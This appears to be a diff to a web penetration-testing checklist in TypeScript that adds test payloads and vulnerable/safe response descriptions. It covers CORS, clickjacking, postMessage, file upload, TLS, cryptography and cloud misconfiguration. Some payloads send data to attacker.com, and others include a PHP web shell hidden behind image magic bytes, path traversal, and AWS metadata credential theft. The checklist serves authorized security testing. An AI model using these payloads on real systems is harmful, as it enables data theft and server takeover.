+          vulnerable: "The Access-Control-Allow-Origin header reflects an arbitrary attacker-supplied Origin, and Access-Control-Allow-Credentials is true, allowing cross-origin reads of authenticated data.",
+          safe: "The server validates Origin against a strict allowlist and never reflects arbitrary origins when credentials are allowed.",
+        },
         severity: "high",
       },
       {
@@ -1745,24 +2789,43 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test CORS with null Origin bypass",
         how: "Send Origin: null (as generated by sandboxed iframes/data: URLs) and check if it's trusted.",
         payloads: ["Origin: null"],
+        expectedResponse: {
+          vulnerable: "Sending Origin: null returns Access-Control-Allow-Origin: null (or reflects it) with credentials allowed, exploitable from sandboxed iframes/data URIs.",
+          safe: "The null origin is not trusted; the server rejects it or omits credentialed CORS headers for it.",
+        },
         severity: "high",
       },
       {
         id: "web-req-cors-3",
         text: "Test CORS with subdomain wildcard trust abuse",
         how: "If the app trusts *.example.com, check whether a takeover-able or attacker-registrable subdomain can abuse that trust.",
+        payloads: ["Origin: https://takenover-subdomain.example.com", "Origin: https://example.com.attacker-controlled.com"],
+        expectedResponse: {
+          vulnerable: "A crafted subdomain not actually owned/trusted by the app is still accepted due to a loose wildcard/regex check on the trusted subdomain pattern.",
+          safe: "The subdomain allowlist check is precise (exact suffix match with proper anchoring), rejecting lookalike or unintended subdomains.",
+        },
         severity: "high",
       },
       {
         id: "web-req-cors-4",
         text: "Test CORS pre-flight bypass for simple requests",
         how: "Check if state-changing requests can be sent as 'simple requests' (avoiding preflight) and still succeed cross-origin.",
+        payloads: ["<form action=\"https://example.com/api/account/update\" method=\"POST\" enctype=\"text/plain\"><input name=\"data\" value='{\"email\":\"x\"}'></form>"],
+        expectedResponse: {
+          vulnerable: "A request that should trigger a preflight is processed without one due to a misconfiguration, allowing an unauthorized cross-origin call to succeed.",
+          safe: "Preflight is correctly required and enforced for non-simple requests, blocking unauthorized cross-origin calls.",
+        },
         severity: "medium",
       },
       {
         id: "web-req-cors-5",
         text: "Build PoC to exfiltrate authenticated data via CORS misconfig",
         how: "Host a page that fetches the sensitive endpoint with credentials:'include' from an attacker origin and confirm the response is readable.",
+        payloads: ["<script>fetch('https://example.com/api/user/profile',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://attacker.com/log?d='+btoa(d)))</script>"],
+        expectedResponse: {
+          vulnerable: "The PoC page, when visited by an authenticated victim, successfully reads and exfiltrates their authenticated data via a cross-origin fetch.",
+          safe: "The cross-origin fetch fails (blocked by CORS policy) and no authenticated data is exfiltrated.",
+        },
         severity: "critical",
       },
     ],
@@ -1778,6 +2841,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for clickjacking via iframe embedding",
         how: "Embed the target page in an iframe on an external page and confirm it renders (no framebusting).",
         payloads: ["<iframe src=\"https://example.com/account/delete\"></iframe>"],
+        expectedResponse: {
+          vulnerable: "The page renders successfully inside an <iframe> on an attacker-controlled page, confirming no frame-busting protection.",
+          safe: "The page refuses to render in an iframe (blank/broken frame) due to frame protections.",
+        },
         severity: "medium",
       },
       {
@@ -1785,18 +2852,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check for X-Frame-Options / CSP frame-ancestors header",
         how: "Inspect response headers on sensitive pages for missing or weak frame-blocking directives.",
         payloads: ["curl -I https://example.com/account"],
+        expectedResponse: {
+          vulnerable: "The X-Frame-Options and CSP frame-ancestors headers are both absent, allowing framing from any origin.",
+          safe: "X-Frame-Options (DENY/SAMEORIGIN) or CSP frame-ancestors is present and correctly restricts framing.",
+        },
         severity: "medium",
       },
       {
         id: "web-req-click-3",
         text: "Build a working clickjacking PoC with overlay UI",
         how: "Overlay a transparent iframe of the sensitive action over a decoy button to demonstrate a real one-click exploit.",
+        payloads: ["<style>iframe{opacity:0.0001;position:absolute;top:0;left:0;width:500px;height:500px;z-index:2}button{position:absolute;top:250px;left:100px;z-index:1}</style><button>Click here to win!</button><iframe src=\"https://example.com/account/delete\"></iframe>"],
+        expectedResponse: {
+          vulnerable: "The overlay PoC successfully tricks a simulated click into triggering the underlying page's action while displaying decoy content.",
+          safe: "The framed page is not renderable or the overlay technique fails to align/trigger the intended action due to frame protections.",
+        },
         severity: "medium",
       },
       {
         id: "web-req-click-4",
         text: "Test drag-and-drop based clickjacking (dragjacking)",
         how: "Check if a sensitive text field (e.g. containing a token) can be exfiltrated by tricking the user into dragging content across frames.",
+        payloads: ["<div draggable=\"true\" ondragstart=\"event.dataTransfer.setData('text', document.querySelector('#api-key').value)\">Drag me</div>"],
+        expectedResponse: {
+          vulnerable: "A drag-and-drop interaction across frame boundaries can exfiltrate data or trigger an action without a full click (dragjacking).",
+          safe: "Frame protections or drag-event restrictions prevent the cross-frame drag-and-drop interaction from succeeding.",
+        },
         severity: "low",
       },
     ],
@@ -1811,24 +2892,44 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-req-pm-1",
         text: "Test for insecure postMessage handlers without origin check",
         how: "Search JS for window.addEventListener('message', ...) handlers that don't validate event.origin before acting on data.",
+        payloads: ["grep -n \"addEventListener('message'\" app.js", "<script>window.frames[0].postMessage(JSON.stringify({type:'setToken',token:'attacker-controlled'}), '*')</script>"],
+        expectedResponse: {
+          vulnerable: "The message event listener processes data without checking event.origin, allowing any origin to send it messages.",
+          safe: "The listener validates event.origin against an explicit allowlist before processing the message.",
+        },
         severity: "high",
       },
       {
         id: "web-req-pm-2",
         text: "Check if origin is properly validated in message listeners",
         how: "Even when origin checks exist, verify they aren't a weak substring/startsWith check bypassable with a similar attacker domain.",
+        payloads: ["https://example.com.attacker.com", "https://notexample.com"],
+        expectedResponse: {
+          vulnerable: "The origin check is missing, uses a weak comparison (e.g. indexOf/includes instead of exact match), or is bypassable.",
+          safe: "The origin check uses a strict, exact-match comparison against trusted origins.",
+        },
         severity: "high",
       },
       {
         id: "web-req-pm-3",
         text: "Test postMessage-based XSS via unsanitized data written to DOM",
         how: "Send a crafted postMessage payload and check if the handler writes it directly into innerHTML or eval.",
+        payloads: ["<script>window.opener.postMessage('<img src=x onerror=alert(document.domain)>', '*')</script>"],
+        expectedResponse: {
+          vulnerable: "Data received via postMessage is written to the DOM (e.g. via innerHTML) without sanitization, resulting in script execution.",
+          safe: "postMessage data is sanitized or written via safe DOM APIs, preventing script execution.",
+        },
         severity: "high",
       },
       {
         id: "web-req-pm-4",
         text: "Test wildcard targetOrigin in outgoing postMessage calls",
         how: "Check if the app sends sensitive data via postMessage with targetOrigin '*', letting any embedding frame read it.",
+        payloads: ["grep -n \"postMessage(.*, ['\\\"]\\*['\\\"])\" app.js", "<iframe src=\"https://example.com/widget\"></iframe><script>window.addEventListener('message', e => fetch('https://attacker.com/log?d='+JSON.stringify(e.data)))</script>"],
+        expectedResponse: {
+          vulnerable: "Outgoing postMessage calls use targetOrigin: \"*\", allowing sensitive data to be received by any origin embedding/opening the page.",
+          safe: "Outgoing postMessage calls specify an explicit, trusted targetOrigin rather than a wildcard.",
+        },
         severity: "medium",
       },
     ],
@@ -1843,30 +2944,55 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-client-storage-1",
         text: "Check for sensitive data stored in localStorage/sessionStorage",
         how: "Inspect browser storage (DevTools → Application) for tokens, PII, or internal identifiers stored in plaintext, accessible to any script on the page (including XSS payloads).",
+        payloads: ["// DevTools console: Object.entries(localStorage); Object.entries(sessionStorage)"],
+        expectedResponse: {
+          vulnerable: "Sensitive data (tokens, PII, internal IDs) is found stored in plaintext in localStorage/sessionStorage, retrievable via any script (including XSS).",
+          safe: "No sensitive data is stored in localStorage/sessionStorage; sensitive tokens use httpOnly cookies instead.",
+        },
         severity: "medium",
       },
       {
         id: "web-client-storage-2",
         text: "Check for sensitive data left in IndexedDB",
         how: "Inspect IndexedDB databases created by the app for cached authenticated API responses or credentials.",
+        payloads: ["// DevTools console: indexedDB.databases().then(dbs => console.log(dbs))"],
+        expectedResponse: {
+          vulnerable: "IndexedDB contains sensitive data left accessible to any script running in the page's origin.",
+          safe: "IndexedDB contains no sensitive data, or data is appropriately encrypted/short-lived.",
+        },
         severity: "medium",
       },
       {
         id: "web-client-storage-3",
         text: "Test Cache-Control on pages/responses containing sensitive data",
         how: "Verify sensitive pages and API responses set Cache-Control: no-store so they aren't retained in the browser's disk cache after logout.",
+        payloads: ["curl -I -b 'session=<token>' https://example.com/api/account | grep -i cache-control"],
+        expectedResponse: {
+          vulnerable: "Pages/responses containing sensitive data lack Cache-Control: no-store, allowing them to be cached by the browser or shared proxies.",
+          safe: "Cache-Control: no-store (or equivalent) is set on all sensitive responses, preventing caching.",
+        },
         severity: "low",
       },
       {
         id: "web-client-storage-4",
         text: "Check Service Worker cache for sensitive cached responses",
         how: "Inspect the Cache Storage API entries registered by a service worker for authenticated API responses cached beyond their intended lifetime.",
+        payloads: ["// DevTools console: caches.keys().then(keys => keys.forEach(k => caches.open(k).then(c => c.keys().then(console.log))))"],
+        expectedResponse: {
+          vulnerable: "The service worker cache contains sensitive API responses retrievable offline or via DevTools, even after logout.",
+          safe: "The service worker excludes sensitive/authenticated endpoints from caching, or clears cache on logout.",
+        },
         severity: "medium",
       },
       {
         id: "web-client-storage-5",
         text: "Test data persistence after logout",
         how: "Log out and check whether localStorage/sessionStorage/IndexedDB entries containing session data are actually cleared, not just the cookie.",
+        payloads: ["// DevTools console before/after logout: JSON.stringify(localStorage), JSON.stringify(sessionStorage)"],
+        expectedResponse: {
+          vulnerable: "Sensitive data (tokens, cached pages) remains accessible in browser storage/cache after logout.",
+          safe: "All sensitive client-side data (storage, cache, memory) is cleared upon logout.",
+        },
         severity: "medium",
       },
     ],
@@ -1882,12 +3008,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for CSS injection via user-controlled style values",
         how: "Inject CSS into user-controlled style attributes/classes to check for data exfiltration via attribute selectors or UI redressing.",
         payloads: ["<div style=\"background:url(https://attacker.com/?x=1)\">"],
+        expectedResponse: {
+          vulnerable: "User-controlled CSS values allow injecting attribute selectors or background-image URLs that exfiltrate page data (CSS injection/exfiltration).",
+          safe: "User-controlled style values are restricted to a safe allowlist of properties/values, preventing exfiltration via CSS.",
+        },
         severity: "medium",
       },
       {
         id: "web-client-res-2",
         text: "Test client-side resource manipulation (DOM-based open redirect / resource loading)",
         how: "Check if client-side JS builds resource URLs (scripts, iframes, API base URL) from attacker-controllable input like the URL fragment.",
+        payloads: ["https://example.com/app#apiBase=https://attacker.com", "https://example.com/redirect.html#/https://evil.com"],
+        expectedResponse: {
+          vulnerable: "Client-side JS uses attacker-controlled data to set window.location or load a resource, resulting in a DOM-based open redirect or malicious resource load.",
+          safe: "Client-side navigation/resource-loading logic validates the data against an allowlist before using it.",
+        },
         severity: "medium",
       },
       {
@@ -1895,12 +3030,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check Subresource Integrity (SRI) on third-party scripts",
         how: "Verify externally-hosted scripts/stylesheets loaded via <script src> include an integrity attribute, so a compromised CDN can't silently serve malicious code.",
         payloads: ["<script src=\"https://cdn.example.com/lib.js\" integrity=\"sha384-...\" crossorigin=\"anonymous\">"],
+        expectedResponse: {
+          vulnerable: "Third-party scripts are loaded without an integrity attribute, so a compromised CDN could serve modified/malicious script with no detection.",
+          safe: "Third-party scripts include a correct integrity (SRI) hash, and the browser blocks execution if the fetched script doesn't match.",
+        },
         severity: "medium",
       },
       {
         id: "web-client-res-4",
         text: "Test for dangling markup injection when full XSS is filtered",
         how: "If script tags are blocked but raw HTML injection is possible, inject an unclosed tag (e.g. <img src='https://attacker.com/log?) to exfiltrate subsequent page content via the browser's own request.",
+        payloads: ["<img src='https://attacker.com/log?", "<base href='https://attacker.com/'>"],
+        expectedResponse: {
+          vulnerable: "Dangling markup injection (an unclosed tag/attribute) causes the browser to capture and exfiltrate subsequent page content to an attacker-controlled URL, even though full script execution is filtered.",
+          safe: "Injected markup is properly closed/sanitized, preventing dangling markup from capturing subsequent content.",
+        },
         severity: "medium",
       },
     ],
@@ -1918,6 +3062,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Unrestricted file type upload",
         how: "Try uploading executable file types (.php, .jsp, .aspx) directly and via extension/content-type bypass tricks.",
         payloads: ["shell.php", "shell.php.jpg", "shell.pHp"],
+        expectedResponse: {
+          vulnerable: "A file with a dangerous extension (e.g. .php, .jsp, .aspx) is accepted and stored in a web-accessible, executable location.",
+          safe: "Only allowlisted, non-executable file types are accepted, and uploads are stored outside the webroot or with execution disabled.",
+        },
         severity: "critical",
       },
       {
@@ -1925,12 +3073,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test extension blacklist bypass with uncommon extensions",
         how: "Try lesser-known executable extensions (.phtml, .pht, .phar) that blacklists often miss.",
         payloads: ["shell.phtml", "shell.pht"],
+        expectedResponse: {
+          vulnerable: "An uncommon executable extension (e.g. .phtml, .pht, .php5) bypasses the blacklist and is accepted/executed.",
+          safe: "The upload validation uses a strict allowlist (not a blacklist), so uncommon executable extensions are rejected.",
+        },
         severity: "critical",
       },
       {
         id: "web-file-upload-3",
         text: "Test Content-Type / magic-byte spoofing bypass",
         how: "Set the Content-Type header and file magic bytes to match an allowed type while keeping a malicious extension/payload.",
+        payloads: ["\\xFF\\xD8\\xFF\\xE0<?php system($_GET['cmd']); ?>  # JPEG magic bytes + PHP payload, saved as shell.php", "curl -F 'file=@shell.php;type=image/jpeg' https://example.com/upload"],
+        expectedResponse: {
+          vulnerable: "A malicious file with a spoofed Content-Type/magic bytes (matching an allowed type) is accepted despite its real, dangerous content.",
+          safe: "The server verifies actual file content/magic bytes server-side, rejecting mismatched or dangerous files regardless of claimed Content-Type.",
+        },
         severity: "critical",
       },
       {
@@ -1938,6 +3095,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test null-byte / double-extension bypass",
         how: "Append a trailing null byte or stack a trusted extension before the malicious one to trick weak validation.",
         payloads: ["shell.php%00.jpg", "shell.jpg.php"],
+        expectedResponse: {
+          vulnerable: "A null-byte (file.php%00.jpg) or double-extension (file.php.jpg) trick causes the server to treat/execute the file as the dangerous type.",
+          safe: "The server correctly parses the true extension and rejects null-byte/double-extension tricks.",
+        },
         severity: "high",
       },
       {
@@ -1945,18 +3106,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test path traversal via upload filename",
         how: "Craft a filename with traversal sequences to write the uploaded file outside the intended upload directory.",
         payloads: ["../../var/www/html/shell.php"],
+        expectedResponse: {
+          vulnerable: "A crafted filename with ../ sequences causes the uploaded file to be written outside the intended upload directory.",
+          safe: "Filenames are sanitized and normalized server-side, confining uploads to the intended directory.",
+        },
         severity: "critical",
       },
       {
         id: "web-file-upload-6",
         text: "Test upload size/DoS limits",
         how: "Upload an extremely large or a decompression-bomb file to check for resource exhaustion handling.",
+        payloads: ["dd if=/dev/zero of=huge.jpg bs=1M count=5000", "wget https://www.bamsoftware.com/hacks/zipbomb/zbsm.zip"],
+        expectedResponse: {
+          vulnerable: "The server accepts an oversized file or unlimited uploads with no size/rate cap, leading to resource exhaustion.",
+          safe: "The server enforces a file size limit and/or rate limiting, rejecting oversized or excessive uploads.",
+        },
         severity: "low",
       },
       {
         id: "web-file-upload-7",
         text: "Test for stored XSS via uploaded HTML/SVG served inline",
         how: "Confirm whether uploaded files are served with a Content-Disposition/Content-Type that prevents inline script execution.",
+        payloads: ["curl -I https://example.com/uploads/user_file.svg | grep -i 'content-type\\|content-disposition'"],
+        expectedResponse: {
+          vulnerable: "An uploaded HTML/SVG file is served inline and its embedded script executes when a victim opens/views it (stored XSS via upload).",
+          safe: "Uploaded HTML/SVG is served with Content-Disposition: attachment or sanitized/stripped of active content before serving.",
+        },
         severity: "high",
         tags: { relatedItemIds: ["web-inject-xss-4"] },
       },
@@ -1965,6 +3140,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for malware/EICAR file upload scanning",
         how: "Upload the EICAR test string as a file to confirm whether antivirus/malware scanning is actually enforced on uploads.",
         payloads: ["X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"],
+        expectedResponse: {
+          vulnerable: "The EICAR test file (or real malware) is accepted and stored without being flagged or quarantined.",
+          safe: "The EICAR test file is detected and rejected/quarantined by the upload's malware scanning.",
+        },
         severity: "medium",
       },
     ],
@@ -1980,30 +3159,54 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for arbitrary file download via path traversal parameter",
         how: "Manipulate a download endpoint's filename parameter with traversal sequences to fetch files outside the intended directory.",
         payloads: ["?file=../../../../etc/passwd"],
+        expectedResponse: {
+          vulnerable: "A traversal payload in the download path parameter retrieves an arbitrary file outside the intended storage directory.",
+          safe: "The download endpoint validates/normalizes the path and confines access to the intended directory.",
+        },
         severity: "critical",
       },
       {
         id: "web-file-dl-2",
         text: "Test for directory listing on file storage directories",
         how: "Directly browse to upload/storage directories to check if listing is exposed.",
+        payloads: ["curl https://example.com/uploads/", "curl https://example.com/storage/user_files/"],
+        expectedResponse: {
+          vulnerable: "Requesting the storage directory path directly returns a raw file listing of stored files.",
+          safe: "The storage directory returns 403/404 for direct listing requests; files are only accessible via authorized, specific links.",
+        },
         severity: "medium",
       },
       {
         id: "web-file-dl-3",
         text: "Test unauthenticated access to storage/CDN buckets",
         how: "Check if cloud storage URLs referenced by the app (S3/GCS) are guessable and publicly readable without a signed URL.",
+        payloads: ["aws s3 ls s3://example-bucket --no-sign-request", "curl https://example-bucket.s3.amazonaws.com/"],
+        expectedResponse: {
+          vulnerable: "The storage/CDN bucket is publicly readable/listable without any authentication.",
+          safe: "The bucket requires authentication/signed access and denies anonymous listing or reads.",
+        },
         severity: "high",
       },
       {
         id: "web-file-dl-4",
         text: "Test signed URL / download-token expiry enforcement",
         how: "Reuse a signed download URL after its intended expiry time and confirm it's rejected.",
+        payloads: ["curl 'https://example-bucket.s3.amazonaws.com/file.pdf?X-Amz-Expires=60&X-Amz-Signature=<sig>'  # replay after 60s expiry"],
+        expectedResponse: {
+          vulnerable: "An expired or already-used signed URL/download token still successfully retrieves the file.",
+          safe: "Expired or single-use tokens are rejected by the server, returning an access-denied error.",
+        },
         severity: "medium",
       },
       {
         id: "web-file-dl-5",
         text: "Test for temp file / backup exposure post-processing",
         how: "Check if server-generated temp files (during export/conversion) are left accessible after the operation completes.",
+        payloads: ["curl https://example.com/tmp/export_12345.csv", "ffuf -u https://example.com/tmp/FUZZ -w tmp-filenames.txt"],
+        expectedResponse: {
+          vulnerable: "A temp file or backup left after processing (e.g. a .tmp or .orig file) is retrievable and exposes sensitive content.",
+          safe: "No temp/backup artifacts remain accessible after processing completes; any leftover files return 403/404.",
+        },
         severity: "medium",
       },
     ],
@@ -2021,30 +3224,54 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check TLS version and cipher strength",
         how: "Scan the target for outdated protocols (TLS 1.0/1.1) and weak ciphers (RC4, 3DES).",
         payloads: ["testssl.sh example.com"],
+        expectedResponse: {
+          vulnerable: "The server supports outdated TLS versions (SSLv3/TLS 1.0/1.1) or weak ciphers (RC4, export-grade), vulnerable to known downgrade/decryption attacks.",
+          safe: "Only TLS 1.2+/1.3 with strong cipher suites are supported; weak protocols/ciphers are disabled.",
+        },
         severity: "medium",
       },
       {
         id: "web-crypto-tls-2",
         text: "Check certificate validity and chain trust",
         how: "Verify the cert isn't expired, self-signed, or missing intermediate chain entries.",
+        payloads: ["openssl s_client -connect example.com:443 -servername example.com | openssl x509 -noout -dates -issuer"],
+        expectedResponse: {
+          vulnerable: "The certificate is expired, self-signed, or has a broken chain, causing browser trust warnings.",
+          safe: "The certificate is valid, correctly chained to a trusted CA, and not expired.",
+        },
         severity: "medium",
       },
       {
         id: "web-crypto-tls-3",
         text: "Check for mixed content (HTTP resources on HTTPS pages)",
         how: "Inspect page resources for any loaded over plain HTTP, which can be MITM'd even on an HTTPS page.",
+        payloads: ["curl -s https://example.com | grep -Eo 'src=\"http://[^\"]+\"|href=\"http://[^\"]+\"'"],
+        expectedResponse: {
+          vulnerable: "The HTTPS page loads one or more resources over plain HTTP, triggering mixed-content warnings and exposing those resources to tampering.",
+          safe: "All resources on the HTTPS page are loaded over HTTPS, with no mixed-content warnings.",
+        },
         severity: "low",
       },
       {
         id: "web-crypto-tls-4",
         text: "Check HSTS header presence and max-age",
         how: "Verify Strict-Transport-Security is set with a sufficiently long max-age and includeSubDomains where appropriate.",
+        payloads: ["curl -I https://example.com | grep -i strict-transport-security"],
+        expectedResponse: {
+          vulnerable: "The HSTS header is missing or has a very short max-age, leaving users vulnerable to protocol-downgrade/SSL-stripping attacks.",
+          safe: "HSTS is present with a long max-age (and ideally includeSubDomains/preload).",
+        },
         severity: "low",
       },
       {
         id: "web-crypto-tls-5",
         text: "Test for HTTP-to-HTTPS downgrade acceptance",
         how: "Confirm the app doesn't accept sensitive requests over plain HTTP even if HTTPS is generally used.",
+        payloads: ["curl -v http://example.com/login -d 'user=admin&pass=x'  # check if plaintext request is processed, not just redirected"],
+        expectedResponse: {
+          vulnerable: "An HTTP request to the site is served directly rather than redirected to HTTPS, allowing a man-in-the-middle to intercept plaintext traffic.",
+          safe: "All HTTP requests are immediately redirected to HTTPS (or refused), preventing plaintext interception.",
+        },
         severity: "medium",
       },
     ],
@@ -2059,36 +3286,66 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-crypto-impl-1",
         text: "Test for weak hashing algorithms",
         how: "Check password/token hashing for outdated algorithms (MD5, SHA1) instead of bcrypt/scrypt/Argon2.",
+        payloads: ["hashcat -m 0 hashes.txt rockyou.txt  # MD5", "hashcat -m 100 hashes.txt rockyou.txt  # SHA1"],
+        expectedResponse: {
+          vulnerable: "Passwords/sensitive data are hashed with a weak/fast algorithm (MD5, SHA1, unsalted SHA256), making them crackable at scale.",
+          safe: "Passwords are hashed with a modern, slow, salted algorithm (bcrypt, scrypt, Argon2).",
+        },
         severity: "high",
       },
       {
         id: "web-crypto-impl-2",
         text: "Check for hardcoded encryption keys in source code",
         how: "Search decompiled/exposed source for static encryption keys or IVs baked into the codebase.",
+        payloads: ["grep -rniE \"(AES|DES|secret|encryption).{0,20}key.{0,5}=.{0,5}['\\\"][A-Za-z0-9+/=]{16,}\" ./src"],
+        expectedResponse: {
+          vulnerable: "An encryption key is found hardcoded in client-side or server-side source code.",
+          safe: "No encryption keys are hardcoded in source; keys are managed via a secure secrets store/KMS.",
+        },
         severity: "critical",
       },
       {
         id: "web-crypto-impl-3",
         text: "Test for predictable token/ID generation",
         how: "Analyze generated tokens/IDs for use of a weak PRNG (e.g. time-seeded) instead of a CSPRNG.",
+        payloads: ["for i in {1..20}; do curl -s -X POST https://example.com/api/session | jq -r '.token'; done  # feed into Burp Sequencer"],
+        expectedResponse: {
+          vulnerable: "Generated tokens/IDs show a predictable pattern (sequential, time-derived, low entropy) allowing them to be guessed.",
+          safe: "Generated tokens/IDs are cryptographically random with sufficient entropy and show no predictable pattern.",
+        },
         severity: "high",
       },
       {
         id: "web-crypto-impl-4",
         text: "Test for ECB mode usage in encrypted data",
         how: "Look for repeating ciphertext blocks in encrypted values, indicating ECB mode which leaks patterns.",
+        payloads: ["AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  # submit as plaintext, check for repeating 16-byte ciphertext blocks in base64/hex output"],
+        expectedResponse: {
+          vulnerable: "Identical plaintext blocks produce identical ciphertext blocks (visible patterns in encrypted images/data), confirming ECB mode.",
+          safe: "Ciphertext shows no repeating block patterns, confirming a mode with proper IV/chaining (e.g. CBC, GCM) is used.",
+        },
         severity: "medium",
       },
       {
         id: "web-crypto-impl-5",
         text: "Test for IV/nonce reuse in encryption",
         how: "Compare multiple ciphertexts for the same plaintext under the same key to check whether IVs are being reused.",
+        payloads: ["curl -X POST https://example.com/api/encrypt -d 'data=test' # repeat identical request twice and diff ciphertext prefixes"],
+        expectedResponse: {
+          vulnerable: "The same IV/nonce is reused across multiple encryption operations with the same key, weakening or breaking confidentiality.",
+          safe: "A unique, random IV/nonce is used for every encryption operation.",
+        },
         severity: "high",
       },
       {
         id: "web-crypto-impl-6",
         text: "Test padding oracle vulnerability",
         how: "Tamper with ciphertext byte-by-byte and observe error message/timing differences that leak padding validity (Vaudenay-style attack).",
+        payloads: ["padbuster https://example.com/download?token=ENCRYPTEDVALUE ENCRYPTEDVALUE 16 -encoding 0"],
+        expectedResponse: {
+          vulnerable: "Different error responses/timing for valid vs. invalid padding allow a padding oracle attack to decrypt or forge ciphertext.",
+          safe: "Padding errors return a uniform, generic response with no timing/content difference, preventing oracle-based attacks.",
+        },
         severity: "critical",
       },
     ],
@@ -2103,18 +3360,33 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-config-1",
         text: "Check for default credentials on server services",
         how: "Try well-known default logins on any admin panels/services discovered during recon.",
+        payloads: ["admin:admin", "admin:password", "root:toor"],
+        expectedResponse: {
+          vulnerable: "A default credential pair successfully authenticates to an exposed server service (admin console, DB, etc.).",
+          safe: "All default credentials are changed/disabled; default credential pairs are rejected.",
+        },
         severity: "high",
       },
       {
         id: "web-config-2",
         text: "Check for directory listing enabled on web directories",
         how: "Browse to directories without an index file and confirm whether a file listing is returned.",
+        payloads: ["curl https://example.com/images/", "curl https://example.com/backup/"],
+        expectedResponse: {
+          vulnerable: "Requesting a web directory returns an auto-generated listing of its files.",
+          safe: "Directory listing is disabled; requests return 403 or a custom index page.",
+        },
         severity: "medium",
       },
       {
         id: "web-config-3",
         text: "Check for verbose server headers/version disclosure",
         how: "Inspect headers for exact software versions that could be matched against known exploits.",
+        payloads: ["curl -I https://example.com | grep -iE 'server|x-powered-by'"],
+        expectedResponse: {
+          vulnerable: "Server headers reveal exact software/version (e.g. \"nginx/1.14.0\"), aiding targeted exploitation.",
+          safe: "Server headers are suppressed or genericized, revealing no exploitable version details.",
+        },
         severity: "low",
       },
       {
@@ -2122,6 +3394,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check for missing security headers",
         how: "Verify presence of X-Content-Type-Options, X-Frame-Options, CSP, Referrer-Policy across key pages.",
         payloads: ["curl -I https://example.com"],
+        expectedResponse: {
+          vulnerable: "Key security headers (CSP, X-Content-Type-Options, X-Frame-Options, Referrer-Policy, HSTS) are missing from responses.",
+          safe: "All relevant security headers are present and correctly configured.",
+        },
         severity: "low",
       },
       {
@@ -2129,6 +3405,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for exposed debug/dev endpoints in production",
         how: "Check for framework debug routes (e.g. /_debug, /actuator, phpinfo()) left enabled in the production build.",
         payloads: ["/actuator/env", "/phpinfo.php"],
+        expectedResponse: {
+          vulnerable: "A debug/dev endpoint (e.g. /debug, /console, /actuator) is reachable in the production environment.",
+          safe: "Debug/dev endpoints are disabled or inaccessible in production, returning 403/404.",
+        },
         severity: "high",
       },
       {
@@ -2136,18 +3416,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test HTTP methods allowed on sensitive endpoints",
         how: "Send an OPTIONS request and confirm dangerous methods (PUT, DELETE, TRACE) aren't unintentionally enabled.",
         payloads: ["curl -X OPTIONS -i https://example.com/api/resource"],
+        expectedResponse: {
+          vulnerable: "An unexpected HTTP method (e.g. PUT, DELETE, or a bypass method) is allowed on a sensitive endpoint and performs an unintended action.",
+          safe: "Only the intended HTTP methods are allowed; other methods return 405 Method Not Allowed.",
+        },
         severity: "medium",
       },
       {
         id: "web-config-7",
         text: "Test for TRACE method enabling XST (cross-site tracing)",
         how: "Confirm TRACE is disabled — if enabled, it can be combined with XSS to bypass HttpOnly cookie protection.",
+        payloads: ["curl -X TRACE -i https://example.com/", "printf 'TRACE / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n' | nc example.com 80"],
+        expectedResponse: {
+          vulnerable: "The TRACE method is enabled and reflects the request (including headers/cookies) back in the response, enabling cross-site tracing.",
+          safe: "The TRACE method is disabled and returns 405/501.",
+        },
         severity: "medium",
       },
       {
         id: "web-config-8",
         text: "Check for exposed internal admin interfaces without IP restriction",
         how: "Verify internal-only tools (metrics, health, admin) aren't reachable from the public internet.",
+        payloads: ["curl https://example.com/actuator/health", "curl https://example.com/metrics", "curl https://example.com/internal/admin"],
+        expectedResponse: {
+          vulnerable: "An internal admin interface is reachable from the public internet with no IP allowlisting or VPN requirement.",
+          safe: "The admin interface is restricted to internal/VPN IP ranges and is unreachable from the public internet.",
+        },
         severity: "high",
       },
     ],
@@ -2163,6 +3457,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for AWS S3 bucket misconfiguration",
         how: "Identify referenced S3 buckets and check for public list/read/write ACLs.",
         payloads: ["aws s3 ls s3://bucket-name --no-sign-request"],
+        expectedResponse: {
+          vulnerable: "The S3 bucket is publicly listable/readable (or writable), exposing or allowing tampering with its contents.",
+          safe: "The S3 bucket enforces proper access policies, denying anonymous list/read/write access.",
+        },
         severity: "critical",
       },
       {
@@ -2170,6 +3468,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for AWS metadata endpoint access via SSRF",
         how: "If SSRF is confirmed, pivot to the cloud metadata service to extract IAM role credentials.",
         payloads: ["http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
+        expectedResponse: {
+          vulnerable: "An SSRF vector reaches the AWS metadata endpoint and retrieves IAM role credentials.",
+          safe: "The metadata endpoint is unreachable via SSRF (e.g. IMDSv2 required, or network egress blocked), so no credentials are obtained.",
+        },
         severity: "critical",
         tags: { relatedItemIds: ["web-inject-ssrf-4"] },
       },
@@ -2177,24 +3479,44 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-cloud-3",
         text: "Check for exposed cloud storage buckets on other providers (GCS/Azure Blob)",
         how: "Enumerate and test public accessibility of any GCS/Azure Blob containers referenced by the app.",
+        payloads: ["curl https://storage.googleapis.com/bucket-name/", "curl https://accountname.blob.core.windows.net/container-name?restype=container&comp=list"],
